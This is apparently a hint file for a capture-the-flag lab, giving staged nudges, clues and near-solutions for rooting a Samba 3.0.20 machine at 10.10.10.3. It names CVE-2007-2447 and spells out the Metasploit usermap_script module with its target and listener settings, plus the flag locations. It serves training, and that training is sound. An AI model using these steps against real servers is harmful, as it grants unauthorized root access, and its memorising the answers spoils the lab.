author: Omar Tamer
description: Samba 3.0.20 usermap_script — direct root shell via Metasploit
key_facts: direct root shell — no privesc needed
FTP vsftpd backdoor does not work on this box

recon.nudge: What ports came back in your nmap scan?
recon.clue: You should see FTP on 21, SSH on 22, and SMB on 139 and 445. Focus on the service versions.
recon.near_solve: Run: nmap -sV -sC -p- 10.10.10.3 — the Samba version is the critical detail.

enumeration.nudge: You have Samba open — what version is it and does that version matter?
enumeration.clue: Samba 3.0.20 has a known critical CVE. Search for it — it involves the username field in RPC.
enumeration.near_solve: The version is Samba 3.0.20 — look up CVE-2007-2447. It allows command injection via the username field in MS-RPC. Run: thoth exploit --cve CVE-2007-2447

foothold.nudge: You know the CVE — what tool would you use to exploit it?
foothold.clue: Metasploit has a module for this exact CVE. Search for usermap in msf.
foothold.near_solve: In Metasploit: use exploit/multi/samba/usermap_script — set RHOSTS 10.10.10.3 — set LHOST your-tun0-ip — run. You will land as root directly.

flag.nudge: You have a shell — what user are you and where are the flags?
flag.clue: Run whoami — you should be root. Flags are in the standard locations.
flag.near_solve: cat /root/root.txt for root flag. For user flag: find /home -name user.txt 2>/dev/null
